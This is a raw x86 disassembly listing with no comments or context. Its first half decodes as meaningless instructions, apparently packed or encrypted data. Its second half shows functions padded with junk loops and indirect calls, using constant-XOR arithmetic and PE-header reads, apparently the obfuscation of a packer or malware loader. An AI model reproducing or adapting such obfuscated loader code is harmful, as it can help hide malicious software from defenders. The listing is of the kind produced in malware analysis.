  413823:	xchg   BYTE PTR [edi+0x3fb719fc],bh
  413829:	jae    0x413873
  41382b:	add    BYTE PTR [ecx-0x3f],0x35
  41382f:	sti    
  413830:	jno    0x41388f
  413832:	aad    0xfe
  413834:	mov    dl,0x83
  413836:	pop    edx
  413837:	mov    dl,0x82
  413839:	enter  0xc4c2,0x16
  41383d:	pop    esi
  41383e:	jae    0x4137fc
  413840:	dec    esp
  413841:	je     0x4137ec
  413843:	in     al,0x6c
  413845:	mov    ebp,0x15f418cf
  41384a:	cld    
  41384b:	out    dx,al
  41384c:	jmp    0x4138c2
  41384e:	dec    BYTE PTR [esi-0xc]
  413851:	mov    fs,WORD PTR [ebx]
  413853:	dec    ebx
  413854:	hlt    
  413855:	iret   
  413856:	push   edx
  413857:	leave  
  413858:	hlt    
  413859:	test   BYTE PTR [ebx+0x33],ah
  41385c:	loope  0x41383d
  41385e:	arpl   WORD PTR [ebp-0x6ad15c],bp
  413864:	mov    esp,0x18af95fc
  413869:	inc    eax
  41386a:	in     al,dx
  41386b:	push   eax
  41386c:	fwait
  41386d:	add    BYTE PTR [ecx],al
  41386f:	stc    
  413870:	inc    ecx
  413871:	adc    BYTE PTR [eax],cl
  413873:	inc    edi
  413874:	test   DWORD PTR [ecx+0x42],0xaa23dfb6
  41387b:	jecxz  0x41384a
  41387d:	xor    dl,BYTE PTR [esi+edx*4+0x2e]
  413881:	mov    dl,0xd0
  413883:	sbb    BYTE PTR [eax-0x1a],0x5f
  413887:	clc    
  413888:	cmp    ch,bh
  41388a:	pop    ds
  41388b:	stc    
  41388c:	dec    ecx
  41388d:	scas   eax,DWORD PTR es:[edi]
  41388e:	jge    0x4138c7
  413890:	aaa    
  413891:	lods   eax,DWORD PTR ds:[esi]
  413892:	jne    0x413814
  413894:	jmp    0xb0af7f8e
  413899:	jae    0x413907
  41389b:	out    0x7b,al
  41389d:	imul   esi,DWORD PTR [edx],0x3c
  4138a0:	xlat   BYTE PTR ds:[ebx]
  4138a1:	xchg   ebx,eax
  4138a2:	ja     0x413884
  4138a4:	in     al,0x46
  4138a6:	pop    ds
  4138a7:	es das 
  4138a9:	rcl    DWORD PTR [ebp+eiz*2-0x50827de2],1
  4138b0:	in     eax,dx
  4138b1:	push   esp
  4138b2:	sbb    BYTE PTR [eax],dl
  4138b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b5:	shr    BYTE PTR [eiz*4-0x1465e484],cl
  4138bc:	and    al,0x73
  4138be:	jbe    0x4138f9
  4138c0:	sub    DWORD PTR [ecx-0x4967f1de],eax
  4138c6:	jmp    0x20101da7
  4138cb:	(bad)  
  4138cc:	ss into 
  4138ce:	je     0x413887
  4138d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138d1:	nop
  4138d2:	jno    0x413888
  4138d4:	es xchg ebx,eax
  4138d6:	jo     0x413921
  4138d8:	jecxz  0x41387c
  4138da:	jne    0x413911
  4138dc:	enter  0xb338,0x3f
  4138e0:	mov    dl,0x56
  4138e2:	pop    edx
  4138e3:	push   ebx
  4138e4:	mov    ds:0xea9814a,eax
  4138e9:	out    dx,eax
  4138ea:	pop    esi
  4138eb:	idiv   BYTE PTR [esp+edi*4+0x2c3438eb]
  4138f2:	leave  
  4138f3:	jecxz  0x41393d
  4138f5:	test   eax,0x4e3e3542
  4138fa:	out    dx,eax
  4138fb:	and    bh,dh
  4138fd:	loope  0x413918
  4138ff:	mov    bl,0xda
  413901:	or     DWORD PTR [edi+0x23552178],0x3b
  413908:	leave  
  413909:	in     eax,0xee
  41390b:	inc    edx
  41390c:	lahf   
  41390d:	jg     0x41396a
  41390f:	pop    ecx
  413910:	inc    esi
  413911:	sub    BYTE PTR [ebp-0x24],bh
  413914:	ds aas 
  413916:	or     eax,ebp
  413918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413919:	je     0x41398d
  41391b:	fiadd  DWORD PTR [edi+esi*8-0x1796c1d5]
  413922:	fist   WORD PTR [ecx]
  413924:	dec    esp
  413925:	push   ebx
  413926:	mov    esp,0x273ec983
  41392b:	fldenv [esi-0x32]
  41392e:	sti    
  41392f:	pop    esp
  413930:	push   eax
  413931:	inc    ebx
  413932:	xor    BYTE PTR [ebp-0x5],dh
  413935:	dec    esp
  413936:	ss pop eax
  413938:	ins    BYTE PTR es:[edi],dx
  413939:	pop    es
  41393a:	xor    DWORD PTR [eax+0x656b8386],ebp
  413940:	jl     0x4138e0
  413942:	mov    esp,0x20e050f0
  413947:	mov    ebp,0x87127332
  41394c:	push   0xffffffbb
  41394e:	xor    al,0x98
  413950:	sbb    al,0x5d
  413952:	adc    al,0x90
  413954:	add    edi,DWORD PTR [edx+edi*1]
  413957:	or     ebx,DWORD PTR [edi]
  413959:	and    ch,BYTE PTR [ebx-0x221b7d6a]
  41395f:	ja     0x4139a9
  413961:	pop    ebp
  413962:	inc    ebp
  413963:	inc    edi
  413964:	xor    eax,DWORD PTR [edx]
  413966:	pop    ss
  413967:	(bad)  
  413968:	mov    dh,0xff
  41396a:	pushf  
  41396b:	test   BYTE PTR [ebp+0x5c2302c4],dh
  413971:	lock add BYTE PTR [edi+0x7c],dh
  413975:	fisubr WORD PTR [ebx-0x4d]
  413978:	jbe    0x4139ac
  41397a:	call   0x4b3f:0xdc04e1fa
  413981:	(bad)  
  413983:	push   0xecdd6cf5
  413988:	test   dh,cl
  41398a:	push   0xffffffdf
  41398c:	and    al,0xe6
  41398e:	jns    0x413931
  413990:	cwde   
  413991:	xchg   ebp,eax
  413992:	das    
  413993:	jae    0x413960
  413995:	jge    0x413a06
  413997:	call   0x7adc1327
  41399c:	push   ebx
  41399d:	dec    edx
  41399e:	in     al,0xc9
  4139a0:	fidivr DWORD PTR [ebp-0x46ba2b9e]
  4139a6:	push   ss
  4139a7:	fld    DWORD PTR [edx+0x68]
  4139aa:	cmp    al,0x2c
  4139ac:	arpl   WORD PTR [ecx+0x42f14c8f],bp
  4139b2:	and    ch,BYTE PTR [esp+ebp*4]
  4139b5:	xor    ah,BYTE PTR [ecx]
  4139b7:	mov    dh,0x58
  4139b9:	into   
  4139ba:	jnp    0x413a2e
  4139bc:	and    al,0xb7
  4139be:	mov    edx,0xae59cbf2
  4139c3:	sbb    al,0x24
  4139c5:	fnstenv [edi-0x6f2d0489]
  4139cb:	xchg   esi,eax
  4139cc:	maskmovq mm7,(bad)
  4139cd:	idiv   DWORD PTR [ecx-0x2ee4b6ed]
  4139d3:	jmp    0xefae01e1
  4139d8:	sub    eax,0x2c25f63
  4139dd:	jnp    0x4139eb
  4139df:	sub    eax,0xc3872726
  4139e4:	sbb    DWORD PTR [ebx-0x19425059],ebp
  4139ea:	and    eax,0x878e5332
  4139ef:	inc    edx
  4139f0:	outs   dx,DWORD PTR ds:[esi]
  4139f1:	cmp    al,0x66
  4139f3:	inc    ecx
  4139f4:	int    0x9b
  4139f6:	mov    bl,BYTE PTR [edx-0x68c19a02]
  4139fc:	or     ecx,DWORD PTR [eax+eax*1-0x34]
  413a00:	sbb    eax,0xaf409a3
  413a05:	sti    
  413a06:	cmp    DWORD PTR [ecx+0x53ee80e3],ebp
  413a0c:	and    ebp,DWORD PTR [ebx-0x65]
  413a0f:	bound  esp,QWORD PTR [edx+0x1b39bd10]
  413a15:	mov    edi,0xa73bf5e5
  413a1a:	test   al,0xf0
  413a1c:	retf   
  413a1d:	daa    
  413a1e:	hlt    
  413a1f:	cwde   
  413a20:	mov    eax,ds:0x9bdd116d
  413a25:	call   0x66af:0x36df4592
  413a2c:	in     eax,0xba
  413a2e:	xchg   ebp,eax
  413a2f:	mov    al,0x48
  413a31:	bound  ebx,QWORD PTR [ebx+eax*4-0x28969182]
  413a38:	mov    al,BYTE PTR [esi-0x31df0743]
  413a3e:	int    0x15
  413a40:	outs   dx,DWORD PTR ds:[esi]
  413a41:	sub    eax,esi
  413a43:	in     eax,0x65
  413a45:	js     0x413a4f
  413a47:	sub    eax,0x81260deb
  413a4c:	cdq    
  413a4d:	and    al,0x3b
  413a4f:	cmp    al,0x82
  413a51:	sub    BYTE PTR [ebx+esi*8-0x1b],bh
  413a55:	out    dx,eax
  413a56:	xchg   esi,eax
  413a57:	cmc    
  413a58:	inc    esi
  413a59:	arpl   bp,ax
  413a5b:	loop   0x413ad1
  413a5d:	test   BYTE PTR [eax],ah
  413a5f:	xchg   ebp,eax
  413a60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a61:	sti    
  413a62:	test   eax,0xd1903a5
  413a67:	jbe    0x413a8f
  413a69:	dec    edi
  413a6a:	jle    0x413ab2
  413a6c:	inc    eax
  413a6d:	scas   al,BYTE PTR es:[edi]
  413a6e:	mov    dh,BYTE PTR [edx-0x1e5651cc]
  413a74:	daa    
  413a75:	add    al,0x7e
  413a77:	jbe    0x413af2
  413a79:	out    0xb1,eax
  413a7b:	adc    bl,BYTE PTR [edx+ebp*2-0x1e]
  413a7f:	enter  0x1a2f,0x8d
  413a83:	xor    DWORD PTR [edi-0x6b],edx
  413a86:	mov    edi,0xbba54c42
  413a8b:	push   edx
  413a8c:	sbb    al,0xfb
  413a8e:	mov    dh,BYTE PTR [edi+esi*8]
  413a91:	dec    eax
  413a92:	and    ah,dh
  413a94:	mov    edi,0xb30cfb97
  413a99:	cdq    
  413a9a:	or     edi,eax
  413a9c:	mov    eax,0x7d34e748
  413aa1:	xchg   ecx,eax
  413aa2:	jnp    0x413a48
  413aa4:	lods   eax,DWORD PTR ds:[esi]
  413aa5:	or     DWORD PTR [eax-0x4254c355],eax
  413aab:	cmp    al,0x42
  413aad:	out    0xfd,al
  413aaf:	retf   0xbf3e
  413ab2:	imul   ebp,ecx,0x7e
  413ab5:	add    DWORD PTR [edx+0x56],0xffffffc4
  413ab9:	inc    esp
  413aba:	sbb    DWORD PTR [edi-0x7d],ecx
  413abd:	cdq    
  413abe:	pop    eax
  413abf:	and    eax,0x99a2c715
  413ac4:	(bad)  
  413ac6:	rdtsc  
  413ac8:	cmp    ebx,ebx
  413aca:	scas   al,BYTE PTR es:[edi]
  413acb:	test   cl,dl
  413acd:	inc    ecx
  413ace:	mov    ds:0x94ad103c,al
  413ad3:	pop    ebx
  413ad4:	daa    
  413ad5:	lock and DWORD PTR [esi+0x1bcad014],0x49
  413add:	mov    esi,0xa4d67846
  413ae2:	jno    0x413aa7
  413ae4:	test   eax,0x51964024
  413ae9:	sbb    edi,ebp
  413aeb:	fstp   DWORD PTR [ebx+eiz*4+0x78]
  413aef:	lock bound ebx,QWORD PTR [ebp-0x61ae8332]
  413af6:	cld    
  413af7:	shr    DWORD PTR [ebp+edx*8+0x7dc2f343],cl
  413afe:	adc    DWORD PTR [edx*2+0x58ed7151],0xffffffeb
  413b06:	lods   eax,DWORD PTR ds:[esi]
  413b07:	jge    0x413a95
  413b09:	test   al,0xe2
  413b0b:	pop    edx
  413b0c:	xchg   DWORD PTR [edx-0x80],edi
  413b0f:	cdq    
  413b10:	sub    al,0x8c
  413b12:	add    eax,0xa6fdad1d
  413b17:	(bad)  
  413b18:	int    0x53
  413b1a:	mov    eax,ds:0xf0e9891
  413b1f:	paddd  mm0,QWORD PTR [ebx-0x16]
  413b23:	fidivr WORD PTR [esi+0x4c]
  413b26:	cmp    BYTE PTR [ecx-0x71c9970c],0xc9
  413b2d:	mov    eax,0x9884414c
  413b32:	push   cs
  413b33:	sub    WORD PTR [edi+edi*4-0x2d],0x7d5c
  413b3a:	gs sbb al,0x95
  413b3d:	xchg   ebp,eax
  413b3e:	cmp    dl,BYTE PTR [esi-0xd]
  413b41:	dec    ecx
  413b42:	or     DWORD PTR [ecx],edx
  413b44:	fmul   DWORD PTR [esp+ebx*4]
  413b47:	add    eax,DWORD PTR [edx]
  413b49:	leave  
  413b4a:	dec    edx
  413b4b:	(bad)  
  413b4c:	out    dx,al
  413b4d:	cmp    BYTE PTR [esi+0x3332946d],dh
  413b53:	aas    
  413b54:	push   bx
  413b56:	xor    BYTE PTR [ecx],0xc9
  413b59:	push   esi
  413b5a:	(bad)  
  413b5b:	repnz (bad) 
  413b5d:	in     eax,0xad
  413b5f:	xor    esp,DWORD PTR [ebx]
  413b61:	pop    ss
  413b62:	lods   al,BYTE PTR ds:[esi]
  413b63:	xlat   BYTE PTR ds:[ebx]
  413b64:	mov    ds:0xb401ec59,eax
  413b69:	pop    ecx
  413b6a:	aas    
  413b6b:	push   ebp
  413b6c:	push   0x6cf3a42f
  413b71:	ss pop ebx
  413b73:	add    bl,BYTE PTR [ebx+0x69]
  413b76:	dec    esp
  413b77:	pop    ds
  413b78:	rcr    BYTE PTR [esi],cl
  413b7a:	retf   0xe81d
  413b7d:	clc    
  413b7e:	xchg   DWORD PTR [esi+0x662eceb3],edx
  413b84:	adc    ch,BYTE PTR [edi+0x1f]
  413b87:	mov    bh,0xf5
  413b89:	gs xchg edx,eax
  413b8b:	push   edx
  413b8c:	mov    edx,0x3a92e8c
  413b91:	inc    edi
  413b92:	aaa    
  413b93:	push   ebx
  413b94:	aas    
  413b95:	(bad)  
  413b96:	fdecstp 
  413b98:	adc    eax,esp
  413b9a:	sar    DWORD PTR [ebp-0x66e3c66],1
  413ba0:	mov    WORD PTR [ebx-0x18],ds
  413ba3:	enter  0x953d,0xd6
  413ba7:	fstp   DWORD PTR [ebx+0x23]
  413baa:	(bad)  
  413bab:	test   al,0xe5
  413bad:	sbb    edx,DWORD PTR [eax+0x41df180c]
  413bb3:	mov    es:0xbf6c24b6,al
  413bb9:	and    DWORD PTR [edx],0xfc260c09
  413bbf:	push   0x53
  413bc1:	test   BYTE PTR [esi-0x11],0x1e
  413bc5:	stc    
  413bc6:	mov    edx,0x8e9e6315
  413bcb:	stc    
  413bcc:	mov    al,ds:0x27ca1f02
  413bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bd2:	or     ebp,DWORD PTR [ebx+eax*8+0x77c1a2f4]
  413bd9:	mov    ebx,0xa058604b
  413bde:	in     al,0x51
  413be0:	hlt    
  413be1:	jl     0x413c51
  413be3:	hlt    
  413be4:	aaa    
  413be5:	pop    edi
  413be6:	jmp    0xd783:0xd103c587
  413bed:	push   DWORD PTR [ebx]
  413bef:	rol    BYTE PTR [ebx-0x29c4ff09],1
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
